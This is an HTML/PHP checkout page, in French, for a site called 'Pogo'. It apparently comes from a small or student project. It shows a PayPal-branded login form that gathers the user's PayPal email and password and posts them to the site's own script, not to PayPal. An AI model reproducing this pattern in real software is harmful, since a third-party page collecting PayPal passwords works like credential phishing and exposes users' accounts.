<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pogo.Ici c'est POGO.</title>
    <link rel="stylesheet" href="https://kit-pro.fontawesome.com/releases/v6.0.0/css/pro.min.css">
    <link rel="stylesheet" href="./css/paypal.css?v=1">
</head>

<body>
    <section>

        <div class="formulaire">

            <form class="form" action="./back/check_paypal.php" method="POST">
                <div class="menu-form">
                    <h1>Paiement</h1>
                </div>
                <div class="input-form">
                    <img src="./res/Paypal-logo.jpg" id="paypal">
                    <p id="connecter">Connectez-vous à PayPal</p>
                    <p>Saisissez votre adresse email ou numéro de mobile pour commencer.</p>
                    <div class="form-group">
                        <input type="text" class="form-control" name="mail_nb" placeholder="Email ou numéro de mobile">
                    </div>
                    <div class="form-group">
                        <input type="password" class="form-control" id="pwd" name="pwd" placeholder="Mot de pass">
                    </div>
                    <div class="form-group" id="pay-now">
                        <button type="submit" class="confirm-purchase">Payer</button>
                    </div>
                    <div class="form-group" id="pay-now">
                        <button type="submit" class="confirm-purchase" name="retourner"
                            value="retourner">Retourer</button>
                    </div>
                </div>
            </form>
        </div>
        </div>

    </section>
    <?php
    include('./reseaux.php');
    ?>
    <!--DEBUT FOOTER-->
    <?php
    include('./footer.php');
    ?>
    <script src="./JavaScript/index.js?v=1"></script>

    <!--DEBUT FOOTER-->
</body>

</html>


<header>
    <img src="./res/Pogo3sansfond.png" alt="">
</header>